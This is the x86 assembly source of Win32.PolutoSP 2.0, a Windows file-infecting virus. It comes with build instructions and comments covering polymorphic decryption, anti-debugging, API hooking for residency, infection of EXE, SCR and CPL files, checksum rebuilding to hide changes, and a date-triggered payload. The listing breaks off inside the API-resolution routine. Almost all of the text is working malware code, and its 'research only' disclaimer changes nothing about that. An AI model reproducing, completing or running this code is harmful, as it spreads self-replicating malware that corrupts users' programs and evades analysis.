;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;*	Name: Win32.PolutoSP (Version:2.0)				*
;*	Target: Portable Exe (PE), SCR, CPL				*
;*	Author: PiKaS	lordjoker@hotmail.com				*
;*	Characteristics:						*
;*	 Semi-Morfic Virus (uses 32 bit keys)				*	
;*	 Resident Per-Process (Hooks APIs like CreateFileA, etc...)	*
;*	 Direct Action Virus (Windows, System and Actual Directories)	*
;*	 Anti-Debugging (Jump if a Debug program is detected...SoftIce)	*
;*	 CRC32 CheckSum File (Rebuild CRC32 of Infected Files)		*
;*	 Detect SFC protected files and Installation Kits		*
;*	Payload: 							*
;*	 Graphic payload (one month later, if 31th: rare spots appear 	*
;*	   on the window and more...)					*	
;*	Size: 6519 Bytes						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;*	Author Notes: This Virus is dedicated to a dead friend		*
;*	 Thanks to Dream Theater, Raphsody and Bind Guardian Music	*
;*	 To Wintermute and BillyBel Tutes and Neuromancer Book	;)  	*
;*	 Sorry for my poor English :P					*
;*	To Build this:							*
;*	 tasm32 -m7 -ml -q -zn P01UT0SP.asm				*
;*	 tlink32 -Tpe -c -aa -v P01UT0SP ,,, import32			*
;*	 pewrsec P01UT0SP.exe						*
;*	 InfMark P01UT0SP.exe /POLT					*
;*	 (The Last is a program that put an Infection Mark 'POLT'	*
;*	  in the Executable File)					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;*	Disclaimer:							*
;*	 This software is for research purposes only			*
;*	 The author is not responsible for any problems caused due to	*
;*	 improper or illegal usage of it				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

.486p						; let's rock
.model flat, stdcall

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Exported APIs for the Host						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

extrn	MessageBoxA:proc			; A Message Box for 1st generation
extrn	ExitProcess:proc			

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Definition of constants						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

MAX_PATH		equ	260						
TamInfo			equ	offset V_Info@2 - offset V_Info@1	; Shit Size
TamVirus@1		equ	offset V_FinalVirus - offset V_Virus	; Virus Encripted Size
TamVirus@2		equ	offset V_FinalVirus - offset V_InicioVirus	; Total Size

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Definition of structures						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

FILETIME	STRUC				; File's time
LowDateTime	DD	?
HighDateTime	DD	?
FILETIME	ENDS

WIN32_FIND_DATA		STRUC			; FindFirst/NextFile Structure
Atributos		DD		?
CreationTime		FILETIME	?
LastAccessTime		FILETIME	?
LastWriteTime		FILETIME	?
FileSizeHigh		DD		?
FileSizeLow		DD		?
Reserved0		DD		?
Reserved1		DD		?
FileName		DB		MAX_PATH DUP (?)
AlternateFileName	DB		13 DUP (?)
			DB		3 DUP (?)    
WIN32_FIND_DATA		ENDS

SYSTEMTIME	STRUC				; System's time (to make some cool things!!)   
Year            DW      ? 
Mes             DW      ? 
DiaSemana       DW      ? 
Dia             DW      ? 
Hora            DW      ? 
Minutos         DW      ? 
Segundos        DW      ? 
Milisegundos    DW      ? 
SYSTEMTIME	ENDS 

MEMORY_BASIC_INFORMATION	STRUC		; If we have to unprotect some memory space
BaseAddress                     DD      ?	; This Structure inform about memory propieties
AllocationBase                  DD      ?
AllocationProtect               DD      ?
RegionSize                      DD      ?
State                           DD      ?
Protect                         DD      ?
lType                           DD      ?
MEMORY_BASIC_INFORMATION	ENDS

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Host Date Section							*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

.data

N_Titulo	db	'Win32.PolutoSP',0	; A Stupid Message Box text
N_Texto		db	'Win32.PolutoSP X [*PiKaS*]LaBs',0

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Host Code Section							*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

.code

V_InicioHost:					; A simple 1st generation host, only shows a 			xor	eax,eax				;  Message Box and finish program
	push	eax
	push	offset N_Titulo
	push	offset N_Texto
	push	eax
	call	MessageBoxA			; Hello... nock, nock...!
	xor	eax,eax
	push	eax
	call	ExitProcess			; Bye!

V_Entrada:
	call	V_InicioVirus			; This is the Entry Point of Host (always in
						;  code section) and call to the last section
						;  where the Virus waits...

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Virus Start 								*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

V_InicioVirus:
	pushad					; Is not importat, but I make it always
	pushfd
	mov	ebp,00h				; Move the Delta Offset to ebp
V_Delta	equ	$-4

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Virus Decriptor Start						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

V_Desencriptar:
	not	eax				; Some Shit Instructions... 
	mov	ecx,00h				; The Virus have 8 decriptors and use each time
	xor	eax,ebx				;  a ramdon 32 bit new key
	sahf
	mov	edx,TamVirus@1
	push	eax
	pop	ebx
	or	ax,bx
	lea	esi,[V_Virus+ebp]
	and	eax,ebx
	stc
V_Bucle:
	xor	byte ptr[esi],cl		; Use SUB/XOR/ADD/ROL/ROR instructions
	daa
	neg	ax
	add	byte ptr[esi],cl
	lahf
	dec	ebx
	inc	esi				; Next byte to Decript
	not	eax
	ror	ecx,08h				; Ror the 32 Bits Key
	inc	ebx
	inc	eax
	dec	edx
	jnz	V_Bucle				; Here jump until the Virus Body is decripted

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* A rare way to get the actual ImageBase				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

V_Virus:
	call	Delta@1
Delta@2:
	mov	esi,esp
	lodsd			; Get the return address
	jmp	Delta@3
Delta@1:
	xor	eax,eax
	jz	Delta@2
Delta@3:
	add	esp,04h
	sub	eax,offset Delta@2 - offset V_InicioVirus	; The Base of Virus Code
	sub	eax,00001000h + offset V_InicioVirus - offset V_InicioHost	; HardCoded in
V_RvaVirus	equ	$-4							; 1st generation
	mov	[H_ImageBase+ebp],eax		; We have the ImageBase

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Virus Body Start							*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

	call	GetKernelAddress		; Obtain the Kernel Base Address
	or	eax,eax				; If Error -> go to Host
	jz	V_VirusError
	call	GetApiAddress			; Get All the APIs we need
	or	eax,eax				; If Error -> go to Host
	jz	V_VirusError
	call	AntiDebugging			; Check for Debuggers
	or	eax,eax				; If a Debugger is present -> go out now
	jz	V_VirusError
	call	IniciarSemilla			; Make a new random 32 bit number (for RNG)
	call	LoadSfcProtected		; Check if SFC.dll is present in System
	call	RuntimeVirus			; Just Find Target Files (Direct Action Part)
	or	ebp,ebp				; If 1st generation -> go to Host
	jz	V_VirusError
	call	SetAllHooks			; Set Hooks in ImportTable for Resident Part
	call	PayloadVirus			; Is time to rock!!...hahaha

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;*  Return Control to Host						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

V_VirusError:
	call	SetReEntrada			; Set up Re-Entry (Need in CPLs Files)
V_VueltaHost:
	mov	eax,[H_ImageBase+ebp]		; Get Real Host Entry Point
	add	eax,00001000h			; HardCoded RVA Host and put it on stack 
V_RvaHost	equ	$-4			
	mov	[esp+24h],eax			
	popfd					; Recuperate initial registers values and jump
	popad					;  to the Host Entry Point		
	ret

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function: Align Values						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

AlinearCifra proc
	push	edx				; Save some registers
	push	ecx
	mov	ecx,[H_Alineamiento+ebp]	; Take the Align factor
	xor	edx,edx
	push	eax
	div	ecx				; Align with it the eax value
	pop	eax
	sub	ecx,edx
	add	eax,ecx				; And we have the Aligned Value in eax
	pop	ecx
	pop	edx
	ret
AlinearCifra endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Virus Function Anti-Debuggers					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

AntiDebugging proc
	lea	eax,[N_IsDebuggerPresent+ebp]	; Check for IsDebuggerPresent API
	push	eax
	mov	eax,[@_KernelAddress+ebp]
	push	eax
	call	[@_GetProcAddress+ebp]
	or	eax,eax
	jz	NoDebuggerPresent@1		; If don't have the API... go out!
	call	eax				; Is a Debbuger Present... yes! hoho
	or	eax,eax
	jnz	DebuggerPresent@1
NoDebuggerPresent@1:
	lea	esi,[N_Sice+ebp]		; Check for SoftIce in Win9x
	call	CreateFile			; Create the Debugger
	inc	eax
	jz	NoDebuggerPresent@2		
	dec	eax				; Hummm... SoftIce win9x is present!
	call	CloseHandleB
	jmp	DebuggerPresent@1
NoDebuggerPresent@2:				; Check for SoftIce in WinNt
	lea	esi,[N_Nice+ebp]
	call	CreateFile
	inc	eax
	jz	NoDebuggerPresent@3
	dec	eax				; Hummm... SoftIce winNT is present!
	call	CloseHandleB
DebuggerPresent@1:
	xor	eax,eax				; If zero returned -> Debugger Present
	ret
NoDebuggerPresent@3:
	xor	eax,eax				; If non zero returned -> Debugger no Present
	inc	eax
	ret
AntiDebugging endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Check possible Hosts					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

ArchivoOk proc
	push	edi					; Save some registers
	push	esi
	mov	eax,[DatosArchivo.FileSizeLow+ebp]	; Use Size-Padding to detect infected 
	mov	ecx,75h					;  files (Size -> 75h)
	xor	edx,edx
	div	ecx
	or	edx,edx
	jz	ArchivoOkError@1
	mov	eax,[DatosArchivo.Atributos+ebp]	; If is a System or a Directory or a
	and	eax,0814h				;  compressed File... don't touch
	jnz	ArchivoOkError@1
	lea	esi,[DatosArchivo.FileName+ebp]
	call	SfcIsFileProtected			; Check if the File is SFC protected
	or	eax,eax
	jnz	ArchivoOkError@1
	call	CreateFile				; Create and Open the File
	inc	eax					;  saving attributes and Date
	jz	ArchivoOkError@1
	dec	eax
	mov	[H_HandleOpen+ebp],eax			; Save the Handle
	mov	ebx,eax
	mov	edi,[DatosArchivo.FileSizeLow+ebp]
	mov	esi,[DatosArchivo.FileSizeHigh+ebp]
	cmp	edi,4000h				; Avoid to infect little and huge
	jb	ArchivoOkError@2			;  files... well
	cmp	edi,03E80000h
	jg	ArchivoOkError@2
	call	FileMapping				; Make a File Mapping 
	or	eax,eax
	jz	ArchivoOkError@2
	mov	[H_HandleMapa+ebp],eax			; And save the handle of map
	mov	ebx,eax
	call	MapViewFile				; And finally create a map view of File
	or	eax,eax
	jz	ArchivoOkError@3
	mov	[@_DirArchivo+ebp],eax			; Save the mapping address
	mov	edi,eax
	mov	ax,[edi]
	cmp	ax,'ZM'					; Check for Dos Signature
	jnz	ArchivoOkError@4
	mov	ax,[edi+18h]
	cmp	ax,40h					; Is a Dos Exe or a New Exe?
	jnz	ArchivoOkError@4
	mov	eax,[edi+3Ch]
	add	edi,eax
	mov	ax,[edi]				; Is a Portable Exe?
	cmp	ax,'EP'
	jnz	ArchivoOkError@4
	mov	eax,[edi+08h]
	cmp	eax,'POLT'				; Have been infected yet?
	jz	ArchivoOkError@4
	mov	ax,[edi+06h]
	cmp	ax,03h					; At least 3 sections
	jc	ArchivoOkError@4
	mov	ax,[edi+14h]
	or	ax,ax					; With Optional Header 
	jz	ArchivoOkError@4
	mov	ax,[edi+16h]
	and	ax,0002h				; Check for Executable
	jz	ArchivoOkError@4
	mov	eax,[edi+2Ch]
	or	eax,eax					; Avoid Dlls with zero code size
	jz	ArchivoOkError@4
	mov	ax,[edi+04h]
	cmp	ax,014Ch				; Only Intel386 
	jnz	ArchivoOkError@4
	mov	ax,[edi+5Ch]
	dec	ax					; SubSystem Windows GUI
	dec	ax
	jz	ArchivoOk@1
ArchivoOkError@4:					; If we have an Error... just Unmap
	mov	ebx,[@_DirArchivo+ebp]			;  and CloseHandle 
	call	UnmapFile
ArchivoOkError@3:
	mov	eax,[H_HandleMapa+ebp]
	call	CloseHandleA
ArchivoOkError@2:
	mov	eax,[H_HandleOpen+ebp]
	call	CloseHandleB
ArchivoOkError@1:
	pop	esi
	pop	edi
	xor	eax,eax					; Return zero -> Bad File
	ret
ArchivoOk@1:						; File is Ok, before infect it we
	mov	ecx,[edi+3Ch]				;  take some values like File Alignment
	mov	[H_Alineamiento+ebp],ecx
	mov	ebx,[@_DirArchivo+ebp]
	call	UnmapFile
	mov	eax,[H_HandleMapa+ebp]
	call	CloseHandleA
	pop	esi
	pop	edi
	xor	eax,eax					; Return a non zero value -> File Ok
	inc	eax
	ret
ArchivoOk endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Search and Infection Virus Routines					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

BuscarArchivos proc
	lea	esi,[V_Mascara@1+ebp]		; We want Exe, Scr and Cpl Files Now!!
	mov	edi,03h				; 3 Exe Files Counter 
BuscarOtro@4:
	lea	eax,[DatosArchivo+ebp]		; Push some pointers and values...
	push	eax
	mov	eax,esi
	push	eax
	call	[@_FindFirstFileA+ebp]		; And call FindFirstFileA API
	inc	eax
	jz	BuscarArchivoError@2		; No more Files? Ok... see ya!
	dec	eax
	mov	[H_HandleArchivo+ebp],eax
BuscarOtro@1:
	call	ArchivoOk			; Is File Ok to Infect?
	or	eax,eax
	jz	BuscarOtro@2			; No?... well, I want more
	call	InfectarArchivo			; Yes?... whahaha... Infect It Now!
	or	eax,eax
	jz	BuscarOtro@2
	dec	edi				; If File Infection is success decrement counter
	jz	BuscarArchivoError@1
BuscarOtro@2:	
	lea	eax,[DatosArchivo+ebp]		; Push some pointers and values again
	push	eax
	mov	eax,[H_HandleArchivo+ebp]
	push	eax
	call	[@_FindNextFileA+ebp]		; Give me more Files
	or	eax,eax
	jnz	BuscarOtro@1			; If more Files are found... repeat process 
BuscarArchivoError@1:
	mov	eax,[H_HandleArchivo+ebp]
	push	eax
	call	[@_FindClose+ebp]		; Close Actual File Search
BuscarArchivoError@2:
	mov	edi,esi				; Change the actual Target (Exe, Scr or Cpl)
	xor	eax,eax				;  and repeat process again
BuscarOtro@5:
	scasb
	jnz	BuscarOtro@5
	mov	esi,edi
	mov	al,[edi]
	xor	edi,edi
	inc	edi
	cmp	al,0BBh
	jnz	BuscarOtro@4			; If no more Targets... bye!
	ret
BuscarArchivos endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Check the Entry Point					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

CheckEntryPoint proc
	push	edi				; Save some registers
	push	esi
	mov	edx,eax				; We have in eax the Image Base and want to
	push	eax				;  find the Image Section Header
	add	edx,[edx+3Ch]
	mov	esi,edx
	add	esi,18h
	movzx	ebx,word ptr[edx+14h]
	add	esi,ebx
	movzx	ecx,word ptr[edx+06h]
	mov	edi,esi
	mov	eax,[edx+28h]			; Put in eax the Real Entry Point
CheckEntry@1:
	mov	ebx,[edi+0Ch]			; Check for the Code Section (the Section that 
	cmp	eax,ebx				;  is pointed by the Entry Point)
	jc	CheckEntry@2
	add	ebx,[edi+10h]
	cmp	eax,ebx
	jnc	CheckEntry@2
	mov	esi,edi
	jmp	CheckEntry@3			; Humm... here is it! take note
CheckEntry@2:
	add	edi,28h
	loop	CheckEntry@1
	jmp	CheckError@1			; If no Code Section is found... grrr... Error
CheckEntry@3:
	mov	ebx,[esi+10h]			; We have the Code Section Header... Let's 
	mov	ecx,[esi+08h]			;  save some values
	cmp	ecx,ebx
	jnc	CheckError@1
	sub	ebx,ecx
	cmp	ebx,06h				; Have 6 bytes free to put some instructions?
	jc	CheckError@1
	pop	eax
	mov	ebx,ecx
	add	ecx,[esi+14h]			; Well, some Rva and Raw plus the address
	add	ebx,[esi+0Ch]			;  of mapping File... for later actions
	add	ecx,eax
	mov	edx,esi
	pop	esi
	pop	edi
	ret
CheckError@1:
	xor	ecx,ecx				; If error -> return a zero value
	pop	eax
	pop	esi
	pop	edi
	ret
CheckEntryPoint endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to calculate the File CheckSum				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

CheckSumMappedFile proc
	push	esi				; Save some registers
	push	ebx
	push	ecx
	inc	ecx
	shr	ecx,01h				; Is a Revised version of CheckSumMappedFile API
	call	ParcialCheckSum			; Call to make the partial CheckSum
	add	esi,[esi+3Ch]
	mov	bx,ax				; We have to make some changes after and...
	xor	edx,edx
	inc	edx
	mov	ecx,edx
	mov	ax,[esi+58h]
	cmp	bx,ax
	adc	ecx,-01h
	sub	bx,cx
	sub	bx,ax
	mov	ax,[esi+5Ah]
	cmp	bx,ax
	adc	edx,-01h
	sub	bx,dx
	sub	bx,ax
	xor	eax,eax
	mov	ax,bx
	pop	ecx
	add	eax,ecx
	mov	[esi+58h],eax			; Here is the CRC File CheckSum in eax
	pop	ebx				; Restore register and finish
	pop	esi	
	ret
CheckSumMappedFile endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Validate the File CheckSum				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

CheckSumValido proc
	push	esi
	add	esi,[esi+3Ch]			; Just Look if the File CheckSum is different 
	mov	eax,[esi+58h]			;  to Zero (no CheckSum is used if Zero)
	pop	esi
	ret
CheckSumValido endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Close a Handle (A=Don't Truncate File)			*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

CloseHandleA proc
	push	eax
	call	[@_CloseHandle+ebp]		; Just Close a Handle
	ret
CloseHandleA endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Close a Handle (B=Truncate File)				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

CloseHandleB proc
	push	esi
	mov	esi,eax
	lea	eax,[DatosArchivo.LastWriteTime+ebp]	; Replace LastWriteTime of File
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	esi
	call	[@_SetFileTime+ebp]			; And make the change effective
	push	esi
	call	[@_CloseHandle+ebp]			; Close File Handle and replace
	push	[H_AtributosFile+ebp]			;  the original File Attributes
	lea	eax,[DatosArchivo.FileName+ebp]
	push	eax
	call	[@_SetFileAttributesA+ebp]
	pop	esi
	ret
CloseHandleB endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to copy Virus in the New Host				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

CopiarHostNuevo proc
	mov	edi,[@_DirArchivo+ebp]		; Set edi and esi to make the Virus Body Copy
	add	edi,[esi+14h]
	add	edi,ebx
	lea	esi,[V_InicioVirus+ebp]
	mov	ecx,TamVirus@2			; Move the Total Size of Virus
	push	esi
	push	edi
	rep	movsb				; Well, move all... hahaha
	pop	edi
	pop	esi
	mov	ecx,edi
	mov	eax,[H_Delta+ebp]		; Before Encript set some internal values
	add	ecx,offset V_Delta - offset V_InicioVirus
	mov	[ecx],eax			; Like Delta, Rva to Virus, Rva to Host and 
	mov	eax,[H_RvaVirus+ebp]		;  the Month Date for payload activation
	add	ecx,offset V_RvaVirus - offset V_Delta
	mov	[ecx],eax
	mov	eax,[H_RvaHost+ebp]
	add	ecx,offset V_RvaHost - offset V_RvaVirus
	mov	[ecx],eax
	mov	ax,[SysDate.Mes+ebp]
	add	ecx,offset V_MesVirus - offset V_RvaHost
	mov	[ecx],ax			; That's all for now!
	ret
CopiarHostNuevo endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Open Files						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

CreateFile proc
	push	esi
	call	[@_GetFileAttributesA+ebp]	; Get the original File Attributes
	inc	eax
	jz	CreateFileError@1		; If error -> don't open file
	dec	eax
	mov	[H_AtributosFile+ebp],eax	; And make File Attributes Normal Archive
	push	00000080h
	push	esi
	call	[@_SetFileAttributesA+ebp]	; Make effective the change
	or	eax,eax
	jz	CreateFileError@1
	xor	eax,eax				; push some typical values
	push	eax
	push	eax
	push	03h				; Open existing File
	push	eax
	inc	eax
	push	eax
	push	0C0000000h			; Read and Write Access
	push	esi
	call	[@_CreateFileA+ebp]		; And Create the File that our baby want...
	ret
CreateFileError@1:
	dec	eax				; If Error -> Return zero
	ret
CreateFile endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Unprotect a Memory Section				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

DesprotegerMemoria proc
	push	TamInfo
	lea	eax,[InfoMemoria+ebp]		; Get the Memory Section Info
	push	eax
	push	ebx
	call	[@_VirtualQuery+ebp]		; How are you?
	or	eax,eax
	jz	DesprotegerError@1		; Humm, error?... don't change then
	lea	eax,[InfoMemoria.Protect+ebp]	; Fine... Make the Section Writeable
	push	eax
	push	04h
	push	dword ptr[InfoMemoria.RegionSize+ebp]
	push	dword ptr[InfoMemoria.BaseAddress+ebp]
	call	[@_VirtualProtect+ebp]		; Now, we can write in Import Section
DesprotegerError@1:
	ret
DesprotegerMemoria endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to encript Virus Body in New Host				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

EncriptarHostNuevo proc
	call	NuevoDesencriptar		; First we create a new Decriptor Routine
	add	edi,offset V_Virus - offset V_InicioVirus
	imul	eax,eax,04h			; And Change the Encription Routine
	lea	esi,[V_Encriptores+ebp]
	add	esi,eax				; Move the New Instructions 
	lodsd
	lea	edx,[V_BucleEncriptar+ebp]	; Set Destination and Origin of the Copy
	mov	[edx],eax
	mov	edx,TamVirus@1
V_BucleEncriptar:				; And copy the Encripted Virus
	rol	byte ptr[edi],cl		; This instructions change in execution with
	xor	byte ptr[edi],cl		;  the correct ones (acording to the generated
	inc	edi				;  Decription Routine)
	ror	ecx,08h
	dec	edx
	jnz	V_BucleEncriptar
	ret					; Bye!
EncriptarHostNuevo endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to create a File Map					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

FileMapping proc
	xor	eax,eax				; Just push some typical values and call
	push	eax				;  the CreateFileMappingA API
	push	edi
	push	esi
	push	04h				; Page with Read and Write
	push	eax
	push	ebx
	call	[@_CreateFileMappingA+ebp]	; Create the File Mapping
	ret
FileMapping endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to get an API Address					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

FullApiAddress proc
FullApi@1:
	push	edi				; Save some registers
	push	esi
	call	[@_GetProcAddress+ebp]		; We need some API address...
	or	eax,eax				; Give me the APIs!!! haha
	jz	FullApiError@1
	mov	[ebx],eax			; If no error we have one... save it
	add	ebx,04h				; And move pointer to get the next one
	xor	al,al
FullApi@2:
	scasb					; Next API Name...and go back
	jnz	FullApi@2
	cmp	byte ptr[edi],0BBh
	jnz	FullApi@1			; If Finish... job done
	xor	eax,eax				; Well... non zero -> all under control
	inc	eax
	ret
FullApiError@1:
	xor	eax,eax				; Zero -> something fails... abort!
	ret
FullApiAddress endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Get all APIs that we need				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

GetApiAddress proc
	mov	ebx,[eax+3Ch]			; We are in the Kernel Base...
	add	eax,ebx
	mov	bx,[eax]
	cmp	bx,'EP'				; And have now the Portable Exe Header pointer
	jnz	GetApiError@1
	mov	ebx,[eax+78h]
	mov	eax,[@_KernelAddress+ebp]
	mov	edx,eax
	add	eax,ebx
	mov	ecx,edx
	mov	ebx,[eax+1Ch]			; Now we need to know where are AddressTable,
	add	ebx,ecx				;  NameTable and Ordinal Table...
	mov	[@_AddressTable+ebp],ebx
	mov	ebx,[eax+20h]
	add	ebx,ecx
	mov	[@_NameTable+ebp],ebx		; And get the address
	mov	ebx,[eax+24h]
	add	ebx,ecx
	mov	[@_OrdinalTable+ebp],ebx
	xor	ebx,ebx
	mov	esi,[@_NameTable+ebp]
GetApi@2:
	lodsd					; Well... try to Find the GetProcAddress
	add	eax,edx				;  String for Virus 
	mov	ecx,[eax]
	cmp	ecx,'PteG'
	jnz	GetApi@1
	mov	ecx,[eax+04h]
	cmp	ecx,'Acor'
	jnz	GetApi@1
	mov	ecx,[eax+08h]
	cmp	ecx,'erdd'
	jnz	GetApi@1
	jmp	GetApi@3			; Great! we have found the API string!
GetApi@1:
	inc	ebx
	jmp	GetApi@2
GetApi@3:
	shl	ebx,01h				; Get the API Ordinal...
	add	ebx,[@_OrdinalTable+ebp]
	movzx	eax,word ptr[ebx]
	shl	eax,02h
	add	eax,[@_AddressTable+ebp]	; ... with the address of API pointer
	mov	ebx,[eax]
	add	ebx,edx				; And finaly we have the API actual address
	mov	[@_GetProcAddress+ebp],ebx
	mov	esi,edx
